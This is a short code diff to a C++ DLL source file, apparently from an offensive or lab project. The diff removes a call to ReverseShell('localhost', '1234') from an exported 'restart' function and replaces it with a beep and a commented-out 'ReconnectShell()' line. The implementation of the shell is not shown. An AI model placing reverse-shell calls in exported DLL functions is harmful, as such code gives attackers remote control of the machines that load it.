@@ -5,7 +5,9 @@
 
 extern "C" __declspec(dllexport) void restart()
 {
-    ReverseShell("localhost", "1234");
+    MessageBeep(MB_ICONEXCLAMATION);
+
+//    ReconnectShell();
     ExitThread(0);
 }
 
